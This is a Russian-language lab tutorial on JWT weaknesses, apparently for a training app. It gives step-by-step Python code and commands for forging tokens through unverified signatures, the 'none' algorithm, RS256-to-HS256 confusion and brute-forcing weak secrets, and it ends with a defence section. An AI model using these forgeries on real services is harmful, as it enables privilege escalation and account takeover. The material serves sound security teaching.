# JWT insecure (JSON Web Token) 

# Описание

JSON Web Token (JWT) - открытый стандарт (RFC 7519), который определяет компактный способ передачи данных как JSON-объектов. Эти данные могут быть верифицированы и поддтверждены, так как они подписываются secret ключом. JWT часто используются в качестве механизма для управления сессиями.

JWT токен состоит из 3 частей, закодированных в base64: Header, Payload, Signature, которые раздены точками. Signature - это подпись, которая вычисляется на основании Header и Payload и зависит от выбранного алгоритма.

# Уязвимости

1. Unverified token problem
2. Алгоритм None
3. Изменение алгоритма подписи с RS256 на HS256
4. Возможность сбрутить secret key 
5. Недостаточная валидация `kid` параметра
  
# Условия

- ОС: любая 
- язык: любой
- компоненты: библиотеки JWT
- настройки: зависят от библиотеки

# Детектирование

Необходимо убедиться, что JWT используются на данном ресурсе. Необходимо искать данные, которые начинаются с `eyJ0eXAiOi`

# Unverified token problem

Unverified token problem означает что отсутствует верификация подписи сервером.

## Эксплуатация

### Шаг 1

Сначала необходимо получить JWT токен. Для этого необходимо залогиниться на http://jwt_insecure.lab/login (user:pass).

В session cookie сервер передает JWT токен, пример: 
```
session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc;
```
JWT токен:
- Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
- Payload: eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9
- Signature: r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc

Для наглядности идем [сюда](https://jwt.io/) и декодируем Header и Payload из JWT токена. Результат:

- Header
```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```
- Payload
```json
{
  "username": "user",
  "is_admin": false
}
```

### Шаг 2
 
Генерируем новый JWT токен, у которого третья часть (Signature) абсолютно любая. 
Для этого можно использовать следующий код для Python 3

```python
import base64

def b64urlencode(data):
    return base64.b64encode(data.encode('ascii')).decode('ascii').replace('+', '-').replace('/', '_').replace('=', '')

print("%s.%s.%s" % (
    b64urlencode("{\"typ\":\"JWT\",\"alg\":\"RS256\"}"), # Header
    b64urlencode("{\"username\":\"user\",\"is_admin\":true}"), # Payload
    b64urlencode("secret_signature") # Some signature, not important
    )
)
```

Полученный JWT токен: 
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6dHJ1ZX0.c2VjcmV0X3NpZ25hdHVyZQ
```

### Шаг 4

Заходим на http://jwt_insecure.lab/index_1 и меняем в заголовке запроса значение session cookie на сгенерированный токен.

Исходный запрос

![](img/utp_6.png)

Запрос после изменения токена

![](img/utp_7.png)

Ответ от сервера

![](img/utp_8.png)

# Алгоритм None

В качестве алгоритма подписи может поддерживаться алгоритм `None` (отсутствие подписи). Все это позволяет менять содержимое токена без каких либо последствий.

## Эксплуатация

### Шаг 1

Сначала необходимо получить JWT токен. Для этого необходимо залогиниться на http://jwt_insecure.lab/login (user:pass).

В session cookie сервер передает JWT токен, пример: 
```
session=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc;
```
JWT токен:
- Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
- Payload: eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9
- Signature: r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc

Для наглядности идем [сюда](https://jwt.io/) и декодируем Header и Payload из JWT токена. Результат:

- Header
```json
{
  "typ": "JWT",
  "alg": "HS256"
}
```
- Payload
```json
{
  "username": "user",
  "is_admin": false
}
```

### Шаг 2
 
Меняем в Header алгоритм подписи на none:
```json
{
  "typ": "JWT",
  "alg": "none"
}
```

### Шаг 3
 
Генерируем новый JWT токен, у которого третья часть (Signature) пустая. Для этого можно использовать следующий код для Python 3

```python
import base64

def b64urlencode(data):
    return base64.b64encode(data.encode('ascii')).decode('ascii').replace('+', '-').replace('/', '_').replace('=', '')

print("%s.%s." % (
        b64urlencode("{\"typ\":\"JWT\",\"alg\":\"none\"}"), # Header with none
        b64urlencode("{\"username\":\"user\",\"is_admin\":false}"), # Payload
    )
)
```

Полученный JWT токен: 
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.
```

### Шаг 4

Заходим на http://jwt_insecure.lab/index_3 и меняем в заголовке запроса значение session cookie на сгенерированный токен.

Исходный запрос

![](img/utp_1.png)

Запрос после изменения токена

![](img/utp_2.png)

Ответ от сервера

![](img/utp_3.png)

Если посмотреть внимательно на Payload

```json
{
  "username": "user",
  "is_admin": false
}
```

можно заметить, что передается два поля: username и is_admin. Первое - имя пользователя, второе - булевый флаг является ли username админом.
Это позволяет:
1. Сделать любого пользователя админом,
2. Залогиниться под любым пользователем.

Пример:

 ```json
{
  "username": "user",
  "is_admin": true
}
```

![](img/utp_4.png)


```json
{
  "username": "admin",
  "is_admin": true
}
```

![](img/utp_5.png)


## Как это работает

При преходе по адресу http://jwt_insecure.lab/index_1 управление передается в `jwt_insecure/app/main.py` в функцию `index_1`

```python
# jwt_insecure/app/main.py
@app.route("/index_1", methods=['GET']) 
def index_1():
	session = request.cookies.get('session')
	isLoggedIn = False

	if session is not None:
		try:
			result = jwt.decode(session, key=jwt_secret, verify=False)
			isLoggedIn = True

		except Exception as err:
			result = str(err)

	else:
		result = ''

	return render_template('index_login.html', isLoggedIn=isLoggedIn, result=result)
```

Для http://jwt_insecure.lab/index_3 управление передается в `jwt_insecure/app/main.py` в функцию `index_3`

```python
# jwt_insecure/app/main.py
@app.route("/index_3", methods=['GET'])
def index_3():
    session = request.cookies.get('session')
    isLoggedIn = False

    if session is not None:
        try:
            result = jwt.decode(session)
            isLoggedIn = True

        except Exception as err:
            result = str(err)

    else:
        result = ''

    return render_template('index_login.html', isLoggedIn=isLoggedIn, result=result)
```

Посмотрим на функцию decode из `pyjwt/jwt/api_jwt.py`

```python
    def decode(self, jwt, key='', verify=True, algorithms=None, options=None, **kwargs):
        # ...
        if options is None:
            options = {'verify_signature': verify}
        else:
            options.setdefault('verify_signature', verify)
            
        decoded = super(PyJWT, self).decode(
            jwt,  # значение session
            key=key,  # jwt_secret
            algorithms=algorithms,  # None
            options=options,  # {'verify_signature': False}
            **kwargs
        )
        # ...
```

Внутри этой функции вызывается `decode` из `pyjwt/jwt/api_jws.py`

```python
    # pyjwt/jwt/api_jws.py
    def decode(self, jwt, key='', verify=True, algorithms=None, options=None, **kwargs):
        # ...
        if not verify:
            # ...
        # значение verify_signature расположено в options['verify_signature'] 
        elif verify_signature:
            # верификация подписи
            self._verify_signature(payload, signing_input, header, signature, key, algorithms)
        # ...
```

Если `verify_signature` равен `False`, то проверка подписи не производится. Таким образом возможна эксплуатация Unverified token problem.

В случае когда производится проверка JWT подписи, происходит вызов _verify_signature

```python
    # pyjwt/jwt/api_jws.py
    def _verify_signature(self, payload, signing_input, header, signature, key='', algorithms=None):
    
        alg = header.get('alg')

        if algorithms is not None and alg not in algorithms:
            raise InvalidAlgorithmError('The specified alg value is not allowed')

        try:
            # экземпляр класса из jwt_insecure/algorithms.py
            alg_obj = self._algorithms[alg]
            # вызов prepare_key для соответствуюшего класса из jwt_insecure/algorithms.py
            key = alg_obj.prepare_key(key)

            # вызов verify для соответствуюшего класса из jwt_insecure/algorithms.py
            if not alg_obj.verify(signing_input, key, signature):
                raise InvalidSignatureError('Signature verification failed')

        except KeyError:
            raise InvalidAlgorithmError('Algorithm not supported')

```

В переменной alg_obj будет экземпляр класса из jwt_insecure/algorithms.py, в данном случае NoneAlgorithm, для которого
будут вызваны функции prepare_key и verify

```python
    # jwt_insecure/algorithms.py
    def prepare_key(self, key):
        if key == '':
            key = None

        if key is not None:
            raise InvalidKeyError('When alg = "none", key value must be None.')

        return key
    
    # ...
    
    def verify(self, msg, key, sig):
        return True
```

Как видно, если отсутсвует ключ и алгоритм подписи токена - none, то он является валидным.

# Изменение алгоритма подписи с RS256 на HS256 

Алгоритм HS256 использует secret key для подписи и верификации. 
Алгоритм RS256 испльзует private key для подписи и public key для верификации.

Если используется RS256. можно попробывать изменить RS256 на HS256. В таком случае, сервер будет использовать public key в качестве secret key, а затем использовать алгоритм HS256 для верификации сигнатуры. 

Так как иногда может происходить утечка public key, можно изменить алгоритм в Header на HS256 и затем верифицировать токен public ключом алгоритма RSA. 

Сервер будет верифицировать токен как HS256, используя как секрет RSA public key. 


## Эксплуатация 

### Шаг 1 

Идем на http://jwt_insecure.lab/index_2, на которой расположен base64 от public ключа

![](img/rshs_1.png)

```
LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FERk44dDdhS1UxbmQ2K1RQYkZFWVJmenIzWApnSE1QZGdzdVZ1c3MrL1UwMjNtRW1vajJ4Zy9lamR0V0UwTWJRUUxkT28rOXlqZmRNbWowYy9NbGYrYXF0M1lPCkNkUWtVV0l1RFZUOVVPTnRBUkFtYWNxQzNQT0xBNXgrcEIyc0ZieWNhT2ZQS2xYV3I2RXZVd2V0TW1PaWNuR1YKeGwrMEIwZDhid1d3TldPV0p3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=
```

Данный ключ необходимо раскодировать в файл public.pem

```bash
echo -n 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlHZk1BMEdDU3FHU0liM0RRRUJBUVVBQTRHTkFEQ0JpUUtCZ1FERk44dDdhS1UxbmQ2K1RQYkZFWVJmenIzWApnSE1QZGdzdVZ1c3MrL1UwMjNtRW1vajJ4Zy9lamR0V0UwTWJRUUxkT28rOXlqZmRNbWowYy9NbGYrYXF0M1lPCkNkUWtVV0l1RFZUOVVPTnRBUkFtYWNxQzNQT0xBNXgrcEIyc0ZieWNhT2ZQS2xYV3I2RXZVd2V0TW1PaWNuR1YKeGwrMEIwZDhid1d3TldPV0p3SURBUUFCCi0tLS0tRU5EIFBVQkxJQyBLRVktLS0tLQo=' | base64 -d > public.pem 
```

public.pem

``` 
-----BEGIN PUBLIC KEY-----
MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDFN8t7aKU1nd6+TPbFEYRfzr3X
gHMPdgsuVuss+/U023mEmoj2xg/ejdtWE0MbQQLdOo+9yjfdMmj0c/Mlf+aqt3YO
CdQkUWIuDVT9UONtARAmacqC3POLA5x+pB2sFbycaOfPKlXWr6EvUwetMmOicnGV
xl+0B0d8bwWwNWOWJwIDAQAB
-----END PUBLIC KEY-----
```


### Шаг 2

Берем значение session_rsa cookie на http://jwt_insecure.lab/index_2:

![](img/rshs_2.png)

```
session_rsa=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.iHlggCS_Znz50o0DlfP8YiFTUkQF8X24WlnUwZu6mxgsYHQm8NNibibvhGg1PiSFkbkobtjB3MpkK4UvZEzZS9f7B4D6Z4xneyBeXer2dbyE8tziTZb31RKjYQMOgSDTUTCaj9r04tTX-IrDqC-Q7YR0aau9GCT4nWiLlVnSlNg
```

Если его декодировать:

```
- Header: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9 - {"typ":"JWT","alg":"RS256"}
- Payload: eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9 - {"username":"user","is_admin":false}
- Signature: iHlggCS_Znz50o0DlfP8YiFTUkQF8X24WlnUwZu6mxgsYHQm8NNibibvhGg1PiSFkbkobtjB3MpkK4UvZEzZS9f7B4D6Z4xneyBeXer2dbyE8tziTZb31RKjYQMOgSDTUTCaj9r04tTX-IrDqC-Q7YR0aau9GCT4nWiLlVnSlNg
```

Для генерации нового session_rsa cookie подписанной public ключом, используя код:

```python
import jwt

file = open('public.pem', 'r').read() # public key

print(jwt.encode({'username': 'user', 'is_admin': True}, # изменяем значение is_admin
        key=file, 
        algorithm='HS256') # меняем с RS256 на HS256
        .decode())
```

Подставляем полученный токен в cookie

![](img/rshs_3.png)

получаем

![](img/rshs_4.png)


# Bruteforce

Если используемый алгоритм подписи использует слабый ключ, то его можно получить с помощью простого перебора.
Это можно сделать с помощью различных утилит:
- [Hashcat](https://twitter.com/hashcat/status/955154646494040065)
- John the ripper
- [jwt tool](https://github.com/ticarpi/jwt_tool)


## Эксплуатация

### Шаг 1

Берем JWT подписаный с помощью алгоритма HS256:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc
```


Используем jwt_tool для брутфоса:

```bash
python2 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJpc19hZG1pbiI6ZmFsc2V9.r2JjnalFCyz14WuyIukEpocbfoNcO9HcV-28TUHgSvc /tmp/wl.txt
```

![](img/brute_1.png)


и находим секретный ключ. В данном случае в качестве ключа использовалась строка secret.

### Шаг 2

Генерируем новый JWT токен, подписаный данным ключом:
```
import jwt

encode = jwt.encode({'username': '3v1lH4xx0r', 'is_admin': True}, 'secret', algorithm='HS256')
print(encode)
```

получаем ключ:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjN2MWxINHh4MHIiLCJpc19hZG1pbiI6dHJ1ZX0.ZOI8SQBvAQngYGVI2YYk-F1TWJc-amSmHs-c1Ai2ed4
```

### Шаг 3

Используем сгенерированный JWT токен:

![](img/brute_2.PNG)


# Недостаточная валидация `kid` параметра

Существуют стандартные поля, используемые в заголовке JWT. Один из них - `kid` - уникальный идентификатор используемого ключа (Key ID). Он указывается когда на сервере используются несколько различных ключей.
Если имеется возможность добавлять свои ключи на сервер, то атакующий может сгенерировать свой пару ключ, загрузить его на сервер, и отправить самодписаный JWT токен, указав в параметре `kid`идентификатор загруженного ключа. Таким образом можно отправлять произвольные JWT, которые будут успешно верефицированные на сервере.

Помимо этого, может быть проблема валидации параметра `kid`. Ключ может храниться на файловой системе или в базе данных. Если есть проблема недостаточной валидации, то можно попробовать изменить само значение ключа на заранее известное и подписать ключ этим значением.


## Эксплуатация (none signature)

### Шаг 1

Генерируем свой ключ и загружаем его на сервер (если используется RS256, то загружать нужно публичный ключ).

### Шаг 2

Генерируем самоподписаный JWT токен, у которого в заголовке должно быть поле kid, в котором нужно указать путь до загруженного ключа.

### Шаг 3 

Отправляем сгенерированный JWT токен.


# Ущерб 

Подмена JWT может потенциально может привести к:
- повышению привелегий
- аутентификации под другими пользователями и тд.


# Защита

1. Проверять актуальность библиотек на своих ресурсах. 
2. Использовать сильные secret ключи. Не использовать одинаковые ключи.
3. Всегда проводить верификацию подписи у токена.
4. В случае использования архитектуры, где проверка токена может выполняться на нескольких серверах, следут использовать RSA. Потому что мы сможем скопировать RSA public ключ на все сервера, и при  компрометации серверов, злоумышленник не получит секретный ключ.
5. Захардкодить алгоритм при верификации токена.


# Дополнительно

1. https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6
2. https://nandynarwhals.org/hitbgsec2017-pasty/
